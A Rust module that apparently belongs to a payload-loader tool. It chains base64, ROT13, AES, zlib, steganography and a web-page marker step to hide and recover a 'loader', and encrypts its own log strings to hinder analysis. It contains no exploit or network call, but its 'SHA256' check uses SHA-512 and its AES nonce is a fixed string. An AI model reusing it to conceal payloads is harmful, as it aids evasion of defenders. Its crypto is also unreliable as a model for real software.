use crate::lsb_text_png_steganography_mod::{hide_mod, reveal_mod};

use anyhow::{Context, Result};

use base64::prelude::*;
use regex::Regex;
use rot13::rot13;
use serde::{Deserialize, Serialize};

use flate2::write::ZlibDecoder;
use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::Write;

use cryptify::encrypt_string;
use log::debug;
use std::env;

use chksum_sha2_512 as sha2_512;


#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum DataOperation {
    BASE64,
    AES(AesMaterial),
    WEBPAGE,
    ROT13, //only after base64 because input is String
    REVERSE,
    STEGANO,
    ZLIB,
    SHA256(SHA256),
}


#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct SHA256 {
    pub hash: String,
}
impl SHA256{
    fn check_sha256(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: SHA256 verify"));
        let digest: chksum_sha2_512::Digest = sha2_512::chksum(data.clone())?;
        let digest_lowercase = digest.to_hex_lowercase();
        if digest_lowercase == self.hash {
            Ok(data)
        }else{
            bail!("sha256 not verified: {}", digest_lowercase)
        }
    }
}


pub trait UnApplyDataOperation {
    fn un_apply_one_operation(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error>;
    fn base64_decode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: BASE64 decode"));
        BASE64_STANDARD
            .decode(data)
            .with_context(|| encrypt_string!("Failed to decode BASE64"))
    }
    fn rot13_decode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ROT13 decode"));
        Ok(rot13(&String::from_utf8(data)?).into_bytes())
    }

    fn webpage_harvesting(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: WEBPAGE harvesting"));
        let haystack = String::from_utf8_lossy(&*data);
        let re = Regex::new(r"!!!(?<loader>\S+)!!!").unwrap();

        let Some(caps) = re.captures(&haystack) else {
            let e: Result<Vec<u8>, anyhow::Error> = Err(anyhow::Error::msg(encrypt_string!(
                "Failed to harvest WEBPAGE"
            )));
            return e;
        };
        Ok(caps["loader"].as_bytes().to_vec())
    }

    fn stegano_decode_lsb(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: STEGANO decode"));
        Ok(reveal_mod(data)?)
    }

    fn zlib_decompress(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ZLIB decode"));
        let writer = Vec::new();
        let mut d: ZlibDecoder<Vec<u8>> = ZlibDecoder::new(writer);
        let _ = d.write_all(&data);
        let writer: Vec<u8> = d.finish()?;
        Ok(writer)
    }
}
impl UnApplyDataOperation for DataOperation {
    fn un_apply_one_operation(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        match self {
            DataOperation::BASE64 => self.base64_decode(data),
            DataOperation::ROT13 => self.rot13_decode(data),
            DataOperation::WEBPAGE => self.webpage_harvesting(data),
            DataOperation::AES(aes_material) => aes_material.decrypt_aes(data),
            DataOperation::STEGANO => self.stegano_decode_lsb(data),
            DataOperation::ZLIB => self.zlib_decompress(data),
            DataOperation::REVERSE => todo!(),
            DataOperation::SHA256(sha256) => sha256.check_sha256(data),
        }
    }
}

pub trait ApplyDataOperation {
    fn apply_one_operation(&mut self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error>;
    fn base64_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: BASE64 encode"));
        Ok(BASE64_STANDARD.encode(data).into_bytes())
    }
    fn rot13_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ROT13 encode"));
        Ok(rot13(&String::from_utf8(data)?).into_bytes())
    }

    fn webpage_create(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: WEBPAGE create"));
        Ok(format!("!!!{}!!!", std::str::from_utf8(&data)?).into_bytes())
    }

    fn stegano_encode_lsb(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: STEGANO encode"));

        let input_image: String = env::var("STEGANO_INPUT_IMAGE").unwrap();
        let output_image: String = env::var("STEGANO_OUTPUT_IMAGE").unwrap();
        debug!(
            "{}{}",
            encrypt_string!("STEGANO_INPUT_IMAGE: "),
            input_image
        );
        debug!(
            "{}{}",
            encrypt_string!("STEGANO_OUTPUT_IMAGE: "),
            output_image
        );
        let img: image::ImageBuffer<image::Rgb<u8>, Vec<u8>> = hide_mod(data, &input_image);

        //TODO, try to remove this part
        //let output_image: String = format! {"{}.stegano.png",input_image};
        debug!("{}{}", encrypt_string!("IMAGE SAVE to "), &output_image);
        img.save(output_image).unwrap();

        //this part is useless as vec is not the good way to save IMAGE
        // TODO: try to img.export to vec, and then save it later differently
        Ok(img.to_vec())
    }

    fn zlib_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ZLIB encode"));
        //let mut e: ZlibEncoder<Vec<u8>> = ZlibEncoder::new(Vec::new(), Compression::default());
        let mut e: ZlibEncoder<Vec<u8>> = ZlibEncoder::new(Vec::new(), Compression::best());
        let _ = e.write_all(&data);
        let compressed_bytes = e.finish()?;
        Ok(compressed_bytes)
    }

}

impl ApplyDataOperation for DataOperation {
    fn apply_one_operation(&mut self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        match self {
            DataOperation::BASE64 => self.base64_encode(data),
            DataOperation::ROT13 => self.rot13_encode(data),
            DataOperation::WEBPAGE => self.webpage_create(data),
            DataOperation::AES(aes_material) => aes_material.encrypt_aes(data),
            DataOperation::STEGANO => self.stegano_encode_lsb(data),
            DataOperation::ZLIB => self.zlib_encode(data),
            DataOperation::REVERSE => todo!(),
            DataOperation::SHA256(sha256) => sha256.check_sha256(data),
        }
    }
}

pub fn apply_all_dataoperations(
    data_operations: &mut Vec<DataOperation>,
    mut data: Vec<u8>,
) -> Result<Vec<u8>, anyhow::Error> {
    data_operations.reverse();
    for operation in data_operations {
        data = operation.apply_one_operation(data)?;
    }
    Ok(data)
}

pub fn un_apply_all_dataoperations(
    dataoperation: Vec<DataOperation>,
    mut data: Vec<u8>,
) -> Result<Vec<u8>, anyhow::Error> {
    for operation in dataoperation {
        //info!("un_apply_one :{:?}",operation);
        data = operation.un_apply_one_operation(data)?;
    }
    Ok(data)
}

use aes_gcm_siv::{
    aead::{Aead, KeyInit, OsRng},
    Aes256GcmSiv,
    Nonce, // Or `Aes128GcmSiv`
};
use anyhow::bail;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct AesMaterial {
    pub key: Vec<u8>,
    pub nonce: [u8; 12],
}
impl AesMaterial {
    fn decrypt_aes(&self, ciphertext: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: AES decrypt"));
        let key: aes_gcm_siv::aead::generic_array::GenericArray<u8, _> =
            aes_gcm_siv::aead::generic_array::GenericArray::clone_from_slice(&self.key);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce = Nonce::from_slice(&self.nonce); // 96-bits; unique per message
        let plaintext: Vec<u8> = match cipher.decrypt(nonce, ciphertext.as_ref()) {
            Ok(data) => data,
            Err(e) => bail!("plaintext error: {}", e),
        };
        Ok(plaintext)
    }

    fn encrypt_aes(&mut self, plaintext: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: AES encrypt"));
        let key: aes_gcm_siv::aead::generic_array::GenericArray<u8, _> =
            aes_gcm_siv::aead::generic_array::GenericArray::clone_from_slice(&self.key);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce: &aes_gcm_siv::aead::generic_array::GenericArray<
            u8,
            aes_gcm_siv::aead::generic_array::typenum::UInt<
                aes_gcm_siv::aead::generic_array::typenum::UInt<
                    aes_gcm_siv::aead::generic_array::typenum::UInt<
                        aes_gcm_siv::aead::generic_array::typenum::UInt<
                            aes_gcm_siv::aead::generic_array::typenum::UTerm,
                            aes_gcm_siv::aead::consts::B1,
                        >,
                        aes_gcm_siv::aead::consts::B1,
                    >,
                    aes_gcm_siv::aead::consts::B0,
                >,
                aes_gcm_siv::aead::consts::B0,
            >,
        > = Nonce::from_slice(&self.nonce);
        let plaintext_u8: &[u8] = &plaintext;
        let ciphertext: Vec<u8> = match cipher.encrypt(nonce, plaintext_u8) {
            Ok(data) => data,
            Err(e) => bail!("ciphertext error: {}", e),
        };
        Ok(ciphertext)
    }
    pub fn generate_aes_material() -> AesMaterial {
        let key: aes_gcm_siv::aead::generic_array::GenericArray<u8, _> =
            Aes256GcmSiv::generate_key(&mut OsRng);
        //TODO randomized the nonce
        // 96-bits; unique per message
        let nonce_slice: &[u8; 12] = b"unique nonce";
        AesMaterial {
            key: key.as_slice().to_owned(),
            nonce: nonce_slice.to_owned(),
        }
    }
}
